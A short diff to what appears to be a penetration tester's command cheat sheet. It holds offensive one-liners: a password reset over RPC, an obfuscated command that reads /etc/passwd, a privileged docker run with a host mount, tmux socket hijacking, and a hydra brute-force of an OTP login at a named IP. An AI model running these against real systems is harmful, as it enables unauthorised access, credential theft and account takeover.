@@ -285,9 +285,6 @@ command: sip show users
 [java decompyle]
 jad file.class
 
-[tmux: attach]
-tmux -S /tmp/shareds attach -t sharedsession
-
 [rpc: change password]
 https://malicious.link/post/2017/reset-ad-user-password-with-linux/
 > setuserinfo2 audit2020 23 password123
@@ -367,7 +364,7 @@ X=$'cat\x20/etc/passwd'&&$X
 /usr/bin/docker container run --detach --privileged --restart=unless-stopped -p 8080:8080 --mount type=bind,source="/home/zac/notes",target=/home/zac/notes https
 
 [attach tmux socket]
-tmux -S /opt/.details attach
+tmux -S .details attach
 
 [hydra: json]
 hydra -l admin@e-shopping-cart.com -P wordlistts.txt 192.95.148.3 http-post-form '/validate-otp:{\"email\"\:\"^USER^\",\"password\"\:\"pass\",\"otp\"\:\"^PASS^\"}:Error' -s 8080 -V
